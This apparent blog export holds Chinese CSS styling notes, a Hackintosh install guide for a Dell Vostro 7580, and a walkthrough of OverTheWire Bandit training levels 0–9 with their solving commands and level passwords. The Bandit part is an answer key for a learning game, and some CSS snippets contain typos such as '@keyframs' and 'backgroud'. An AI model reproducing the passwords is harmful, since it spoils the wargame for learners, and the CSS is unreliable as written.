<h3 id="列表li"><a href="#列表li" class="headerlink" title="列表li"></a>列表li</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ul</span>, <span class="selector-tag">li</span>&#123; </span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">list-style</span>:none</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="按钮button"><a href="#按钮button" class="headerlink" title="按钮button"></a>按钮button</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">button</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid transparent;  </span><br><span class="line">    <span class="attribute">outline</span>: none; </span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文本框textarea"><a href="#文本框textarea" class="headerlink" title="文本框textarea"></a>文本框textarea</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">textarea</span>&#123;</span><br><span class="line">    <span class="attribute">resize</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="输入框input"><a href="#输入框input" class="headerlink" title="输入框input"></a>输入框input</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="表格table"><a href="#表格table" class="headerlink" title="表格table"></a>表格table</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">	<span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">	<span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span>, <span class="selector-tag">table</span> <span class="selector-tag">td</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#f7f7f7</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="子元素"><a href="#子元素" class="headerlink" title="子元素"></a>子元素</h2><blockquote>
<p>nth-child(): <a href="https://www.w3h5.com/post/101.html">https://www.w3h5.com/post/101.html</a></p>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*选择span元素的第n个子元素*/</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(n)&#123; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-pseudo">:nth-child</span>(even)&#123;&#125; <span class="comment">/*偶数元素*/</span></span><br><span class="line"><span class="selector-pseudo">:nth-child</span>(odd)&#123;&#125; <span class="comment">/*奇数元素*/</span></span><br><span class="line"><span class="selector-pseudo">:nth-child</span>(n+m)&#123;&#125; <span class="comment">/*第m个元素及以后的元素*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*选中第一个子元素*/</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-pseudo">:first</span>-child()&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*选中最后一个子元素*/</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-pseudo">:last-child</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-pseudo">:not</span>()<span class="comment">/*否定伪类*/</span></span><br></pre></td></tr></table></figure>

<h2 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-letter</span>&#123; <span class="comment">/*第一个字母*/</span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-line</span>&#123; <span class="comment">/*第一行*/</span></span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::selection</span>&#123; <span class="comment">/*选中内容*/</span></span><br><span class="line">    <span class="attribute">background-color</span>: greenyellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::before</span>&#123; <span class="comment">/*元素开始*/</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::after</span>&#123; <span class="comment">/*元素最后*/</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>



<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    backgroud: <span class="built_in">url</span>(<span class="string">&#x27;bg.jpg&#x27;</span>) repeat-x; <span class="comment">/*水平重复*/</span></span><br><span class="line">    <span class="attribute">background-repeat</span>: repeat-x;</span><br><span class="line">    <span class="attribute">background-position</span>: bottom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="导入外部字体"><a href="#导入外部字体" class="headerlink" title="导入外部字体"></a>导入外部字体</h2><p><strong>注意版权问题</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span>&#123;</span><br><span class="line">    <span class="comment">/*指定字体名字*/</span></span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;思源宋体&#x27;</span>;</span><br><span class="line">    <span class="comment">/*指定字体路径*/</span></span><br><span class="line">    <span class="attribute">src</span> : <span class="built_in">url</span>(<span class="string">&#x27;../fonts/syst.ttf&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图标字体"><a href="#图标字体" class="headerlink" title="图标字体"></a>图标字体</h2><ul>
<li><a href="https://www.iconfont.cn/">iconfont</a></li>
<li><a href="http://www.fontawesome.com/">http://www.fontawesome.com/</a></li>
</ul>
<h2 id="段落首行缩进"><a href="#段落首行缩进" class="headerlink" title="段落首行缩进"></a>段落首行缩进</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">text-indent</span>: <span class="number">25px</span>;</span><br></pre></td></tr></table></figure>

<h2 id="元素对齐方式"><a href="#元素对齐方式" class="headerlink" title="元素对齐方式"></a>元素对齐方式</h2><ul>
<li>vertical-align 设置元素垂直对齐的方式<ul>
<li>baseline 默认值 基线对齐</li>
<li>top 顶部对齐</li>
<li>bottom 底部对齐</li>
<li>middle 居中对齐</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">vertical-align</span>: bottom;</span><br></pre></td></tr></table></figure>

<h2 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h2><ul>
<li>text-decoration 设置文本修饰<ul>
<li>none 什么都没有</li>
<li>underline 下划线</li>
<li>line-through 删除线</li>
<li>overline 上划线</li>
</ul>
</li>
</ul>
<h2 id="处理空白"><a href="#处理空白" class="headerlink" title="处理空白"></a>处理空白</h2><ul>
<li><code>white-space</code> 设置网页如何处理空白<ul>
<li>normal 正常</li>
<li>nowrap 不换行</li>
<li>pre 保留空白</li>
</ul>
</li>
</ul>
<p><strong>设置多余部分变省略号效果</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20</span></span><br><span class="line">    white-space: nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">./img/bg.png</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>background-repeat</code><ul>
<li>repeat 默认值，背景会沿x轴 y轴双方向重复</li>
<li>repeat-x</li>
<li>repeat-y</li>
<li>no-repeat 不重复</li>
</ul>
</li>
<li><code>background-position</code><ul>
<li>center center 居中</li>
</ul>
</li>
<li><code>background-size</code><ul>
<li>cover	图片比例不变，将元素铺满</li>
<li>contain 图片比例不变，将图片在元素中完整显示</li>
</ul>
</li>
</ul>
<h2 id="过渡"><a href="#过渡" class="headerlink" title="过渡"></a>过渡</h2><ul>
<li><p>过渡（transition)</p>
<ul>
<li>通过过渡可以指定一个属性发生变化时的切换方式</li>
<li>通过过渡可以创建一些非常好的效果，提升用户体验</li>
</ul>
</li>
<li><p><code>transition-property</code> 指定要执行过渡的属性</p>
<ul>
<li><p>多个属性间使用 <code>,</code> 隔开</p>
</li>
<li><p>如果所有书序都需要过渡，则使用all关键字</p>
</li>
<li><p>大部分属性都支持过渡效果，注意过渡时必须是从一个有效数值向另外一个有效数值进行过渡</p>
</li>
<li><p><code>transitiion-property: height, width;</code></p>
</li>
</ul>
</li>
<li><p><code>transition-duration</code> 指定过渡效果的持续时间</p>
</li>
<li><p>时间单位 <code>s</code> 和 <code>ms</code></p>
</li>
<li><p><code>transition-duration: 100ms;</code></p>
</li>
<li><p><code>transition-timing-function</code> 过渡的时序函数</p>
<ul>
<li><p>指定过渡的执行方式</p>
</li>
<li><p>可选值</p>
<ul>
<li><p>ease 默认值 慢速开始，先加速后减速</p>
</li>
<li><p>linear 匀速运动</p>
</li>
<li><p>ease-in 加速运动</p>
</li>
<li><p>ease-out 减速运动</p>
</li>
<li><p>ease-in-out 先加速 后减速</p>
</li>
<li><p>cubic-bezier() 指定时序函数</p>
<ul>
<li><blockquote>
<p><a href="https://cubic-bezier.com/">https://cubic-bezier.com</a></p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>transition-timing-function: ease;</code></p>
</li>
</ul>
</li>
<li><p><code>transition-delay</code> 过渡效果的延迟，等待一段时间后再执行过渡</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">scroll-behavior: smooth; <span class="comment">/*平滑滚动*/</span></span><br></pre></td></tr></table></figure>



<h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><ul>
<li><p>动画和过渡类似，都是可以实现一些动态的效果，不同的是过渡需要在某个属性发生变化时才会触发，动画可以自动触发动态效果</p>
</li>
<li><p>设置动画效果，必须先要设置一个关键帧，关键帧设置了动画执行每一个步骤</p>
</li>
<li><p>animation-name 要对当前元素生效的关键帧的名字</p>
</li>
<li><p>animation-duration 动画的执行时间</p>
</li>
<li><p>animation-delay 动画的延时</p>
</li>
<li><p>animation-iteration-count 动画执行的次数</p>
<ul>
<li>infinite 无限执行</li>
</ul>
</li>
<li><p>animation-direction 动画运行方向</p>
<ul>
<li>normal 默认值，从 from 向 to 运行</li>
<li>reverse 反方向执行</li>
<li>alternate    from-&gt;to-&gt;from</li>
</ul>
</li>
<li><p>animation-play-state 设置动画执行状态</p>
<ul>
<li>running 默认值 动画执行</li>
<li>paused 动画暂停</li>
</ul>
</li>
<li><p>animation-fill-mode 动画的填充方式</p>
<ul>
<li>none 默认值 动画执行完毕后元素回到原来位置</li>
<li>forwards 动画执行完毕后元素会停止在动画结束的位置</li>
<li>backwards 动画延时等待时，元素就会处于开始位置</li>
<li>both 结合了 forwards 和 backwards</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@keyframs</span> test&#123;</span><br><span class="line">    <span class="comment">/* from 表示动画的开始位置，也可以是0%*/</span></span><br><span class="line">    <span class="selector-tag">from</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to 动画的结束位置，也可以是100%*/</span></span><br><span class="line">    <span class="selector-tag">to</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">animation-name</span>: test;</span><br><span class="line">    <span class="attribute">animation-duration</span>: <span class="number">2s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h2><ul>
<li>对元素进行缩放<ul>
<li>scaleX() 水平方向缩放</li>
<li>scaleY() 垂直方向缩放</li>
<li>scale() 双方向缩放</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h2 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h2><h3 id="vw"><a href="#vw" class="headerlink" title="vw"></a>vw</h3><ul>
<li>vw 表示的是视口的宽度（viewport width）<ul>
<li>100 vw &#x3D; 一个视口的宽度</li>
<li>1 vw &#x3D; 1% 视口宽度</li>
</ul>
</li>
<li>通常设计图的宽度为 750px 或1125px<ul>
<li>0.13333333333333vw &#x3D; 1px</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">5.3333vw</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	1 rem = 40px;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">18.75rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Develop</category>
      </categories>
      <tags>
        <tag>WebDev</tag>
      </tags>
  </entry>
  <entry>
    <title>DELL Vostro 7580 黑苹果安装</title>
    <url>/2020/09/28/Hackintosh/</url>
    <content><![CDATA[<h1 id="DELL-Vostro-7580-黑苹果安装"><a href="#DELL-Vostro-7580-黑苹果安装" class="headerlink" title="DELL Vostro 7580 黑苹果安装"></a>DELL Vostro 7580 黑苹果安装</h1><blockquote>
<p>本机配置:</p>
<p>型号：DELL Vostro 7580</p>
<p>配置：i5-8300H + Intel UHD Graphics 630 + GTX 1050 + ALC256 + Intel(R) Wireless-AC 9462 + Killer E2400</p>
<p>注意事项：</p>
<ol>
<li>如果是 <a href="https://github.com/daliansky/Hackintosh">黑果小兵</a> 中维护的机型那直接去下载使用对应机型的引导</li>
<li>本方法需要下载原版镜像，如果有Macbook或已经装上了黑果那可以直接在Appstore下载，如果无那请参考其他博客😅<ul>
<li>可以试试用 Etcher 把网上冲浪得到的原版dmg镜像写入U盘（未尝试，仅猜测</li>
<li>（太久了咱也忘记了当时折腾过啥了</li>
</ul>
</li>
<li>本方法安装的是 macOS CataLina，新版的系统没有尝试过（猜测行不通</li>
<li>采用 OC 引导，本机机型整理好的OC引导<a href="https://github.com/ex7l0it/OC_vostro7580">这里下载</a></li>
</ol>
</blockquote>
<h2 id="折腾思路"><a href="#折腾思路" class="headerlink" title="折腾思路"></a>折腾思路</h2><ol>
<li>在黑果小兵的 <a href="https://github.com/daliansky/Hackintosh">Hackintosh 黑苹果长期维护机型 EFI 及安装教程整理</a> 找自己的笔记本机型，如果有那恭喜，直接点链接下载使用就好</li>
<li>如果无，那弄清楚自己笔记本的各种配置信息，带着配置在github上搜或者在上一步长期维护清单上找配置基本一致的引导，整下来试一试</li>
<li>如果不行或者还是搜不到，那就只能一个一个配置的去搜了，然后费时费力手动拼凑</li>
</ol>
<h2 id="最终成果"><a href="#最终成果" class="headerlink" title="最终成果"></a>最终成果</h2><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201003192556535.png" alt="image-20201003192556535"></p>
<h2 id="OC-引导"><a href="#OC-引导" class="headerlink" title="OC 引导"></a>OC 引导</h2><p>主要使用 Dell-Inspiron7590 的OC引导：</p>
<p><a href="https://github.com/Pinming/Dell-Inspiron-7590-Hackintosh-Opencore/">https://github.com/Pinming/Dell-Inspiron-7590-Hackintosh-Opencore/</a></p>
<p>使用此EFI文件可驱动本机的UHD Graphics 630显卡、Intel Wireless-AC 9462无线网卡、蓝牙、触摸板，不可驱动声卡和有线网卡</p>
<h3 id="声卡驱动修复"><a href="#声卡驱动修复" class="headerlink" title="声卡驱动修复"></a>声卡驱动修复</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201002151234556.png" alt="image-20201002151234556"></p>
<p>修复声卡无法驱动方法：</p>
<p><strong>方法1：</strong></p>
<p>删除 Apple.kext，换用 VoodooHDA.kext</p>
<p>这里参考的是与本机有相同声卡型号的Huawei Matebook X Pro的OC引导文件中的相关文件与配置</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201006093903582.png" alt="image-20201006093903582"></p>
<p>存在的问题：</p>
<ol>
<li>整体音量较小</li>
<li>耳机插入后音质极差，存在爆音</li>
</ol>
<p><strong>方法2：</strong></p>
<p>声卡注入：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201019231832905.png" alt="image-20201019231832905"></p>
<h3 id="有线网卡驱动修复"><a href="#有线网卡驱动修复" class="headerlink" title="有线网卡驱动修复"></a>有线网卡驱动修复</h3><p>添加 AtherosE2200Ethernet.kext 驱动</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201006093656333.png" alt="image-20201006093656333"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201006105537885.png" alt="image-20201006105537885"></p>
<p><strong>整理后的OC引导：<a href="https://github.com/ex7l0it/OC_vostro7580">https://github.com/ex7l0it/OC_vostro7580</a></strong></p>
<h3 id="OC-引导安装"><a href="#OC-引导安装" class="headerlink" title="OC 引导安装"></a>OC 引导安装</h3><p>这里直接将引导安装到电脑硬盘上，在PE中使用DiskGenius把OC引导的文件夹扔进ESP分区的 EFI 文件夹里即可，开机时 F12 选择 OC 即可</p>
<ul>
<li>如果识别不到引导<ul>
<li>可以使用 easyUEFI 添加引导</li>
</ul>
</li>
</ul>
<blockquote>
<p>更新时备注：再具体的操作问题已经忘记了，问题不大，慢慢折腾总会成功的</p>
</blockquote>
<h2 id="制作安装U盘"><a href="#制作安装U盘" class="headerlink" title="制作安装U盘"></a>制作安装U盘</h2><p>参考：<a href="https://www.jianshu.com/p/5255971c6eeb">https://www.jianshu.com/p/5255971c6eeb</a></p>
<p>去 AppStore 下载macOS CataLina 10.15.7的安装镜像</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165523815.png" alt="image-20201005165523815"></p>
<p>等待下载完成，这个时间先把U盘格式化：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165637898.png" alt="image-20201005165637898"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165837145.png" alt="image-20201005165837145"></p>
<p>下载完成后，不要点继续，打开终端敲命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /Applications/Install\ macOS\ Catalina.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165915030.png" alt="image-20201005165915030"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165933359.png" alt="image-20201005165933359"></p>
<p>等待写入完成</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005173449412.png" alt="image-20201005173449412"></p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>软件资源站：<del><a href="https://www.macwk.com/">https://www.macwk.com/</a></del></p>
<blockquote>
<p>更新时备注：已经无了</p>
</blockquote>
<h3 id="Command-Line-Developer-Tools-下载安装"><a href="#Command-Line-Developer-Tools-下载安装" class="headerlink" title="Command Line Developer Tools 下载安装"></a>Command Line Developer Tools 下载安装</h3><p><a href="https://developer.apple.com/download/more/">https://developer.apple.com/download/more/</a></p>
<h3 id="HomeBrew-安装"><a href="#HomeBrew-安装" class="headerlink" title="HomeBrew 安装"></a>HomeBrew 安装</h3><p>安装脚本：<a href="https://raw.githubusercontent.com/Homebrew/install/master/install.sh">https://raw.githubusercontent.com/Homebrew/install/master/install.sh</a></p>
<p>下载速度太慢解决方法：<a href="https://www.jianshu.com/p/c7c7aa34e579">https://www.jianshu.com/p/c7c7aa34e579</a></p>
]]></content>
      <categories>
        <category>折腾记</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>hackintosh</tag>
      </tags>
  </entry>
  <entry>
    <title>OverTheWire-Bandit 靶场</title>
    <url>/2020/02/07/OverTheWire-Bandit/</url>
    <content><![CDATA[<h1 id="OverTheWire-Bandit-靶场"><a href="#OverTheWire-Bandit-靶场" class="headerlink" title="OverTheWire Bandit 靶场"></a>OverTheWire Bandit 靶场</h1><p><a href="https://overthewire.org/wargames/bandit">https://overthewire.org/wargames/bandit</a></p>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><blockquote>
<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is <strong>bandit.labs.overthewire.org</strong>, on port 2220. The username is <strong>bandit0</strong> and the password is <strong>bandit0</strong>. Once logged in, go to the <a href="https://overthewire.org/wargames/bandit/bandit1.html">Level 1</a> page to find out how to beat Level 1.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br><span class="line">cat readme</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200206220345257.png" alt="image-20200206220345257"></p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a file called <strong>-</strong> located in the home directory</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ./-</span><br></pre></td></tr></table></figure>

<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a file called <strong>spaces in this filename</strong> located in the home directory</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &quot;spaces in this filename&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a hidden file in the <strong>inhere</strong> directory.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ./inhere/.hidden</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207115316954.png" alt="image-20200207115316954"></p>
<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in the only human-readable file in the <strong>inhere</strong> directory. Tip: if your terminal is messed up, try the “reset” command.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ./inhere/-file07</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207120610310.png" alt="image-20200207120610310"></p>
<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><blockquote>
<p>Level Goal</p>
<p>The password for the next level is stored in a file somewhere under the <strong>inhere</strong> directory and has all of the following properties:</p>
<ul>
<li>human-readable</li>
<li>1033 bytes in size</li>
<li>not executable</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br></pre></td></tr></table></figure>

<p>du 命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a或-all 显示目录中个别文件的大小。</span><br><span class="line">-b或-bytes 显示目录或文件大小时，以byte为单位。</span><br><span class="line">-c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。</span><br><span class="line">-h或--human-readable 以K，M，G为单位，提高信息的可读性。</span><br><span class="line">-k或--kilobytes 以1024 bytes为单位。</span><br><span class="line">-l或--count-links 重复计算硬件连接的文件。</span><br><span class="line">-m或--megabytes 以1MB为单位。</span><br><span class="line">-s或--summarize 仅显示总计。</span><br><span class="line">-X&lt;文件&gt;或--exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。</span><br><span class="line">--exclude=&lt;目录或文件&gt; 略过指定的目录或文件。</span><br><span class="line">--max-depth=&lt;目录层数&gt; 超过指定层数的目录后，予以忽略。</span><br></pre></td></tr></table></figure>

<p><img src="/XSS/image-20200207121629558.png" alt="image-20200207121629558"></p>
<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><blockquote>
<p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p>
<ul>
<li>owned by user bandit7</li>
<li>owned by group bandit6</li>
<li>33 bytes in size</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br></pre></td></tr></table></figure>

<p>find 命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-user 指定所有者</span><br><span class="line">-group 指定所在用户组</span><br><span class="line">-size 指定文件大小  c(byte) k(kb)</span><br></pre></td></tr></table></figure>

<p>错误信息隐藏：<code>2&gt;/dev/null</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207123201812.png" alt="image-20200207123201812"></p>
<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi data.txt</span><br><span class="line">定位：</span><br><span class="line">/millionth</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207123910069.png" alt="image-20200207123910069"></p>
<p>或者利用 grep</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207124059889.png" alt="image-20200207124059889"></p>
<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br></pre></td></tr></table></figure>

<p>sort命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文本排序sort        </span><br><span class="line">sort -r  执行反方向（由上至下）整理                      </span><br><span class="line">sort -R  随机排序</span><br><span class="line">sort -n  执行数字大小整理               </span><br><span class="line">sort -f  选项忽略字符串中的字符大小写</span><br><span class="line">sort -u  删除输出中的重复行        </span><br><span class="line">sort -t  c 使用c作为定段界定符        </span><br><span class="line">sort -k  x 按照使用c分割的x整理并使用多次</span><br></pre></td></tr></table></figure>

<p>uniq命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uniq -c  显示没行重复出现的次数                       </span><br><span class="line">uniq -d  仅显示重复过的行</span><br><span class="line">uniq -u  仅显示不曾重复的行   连续且完全相同方为重复</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207125030652.png" alt="image-20200207125030652"></p>
<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, beginning with several ‘&#x3D;’ characters.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br></pre></td></tr></table></figure>

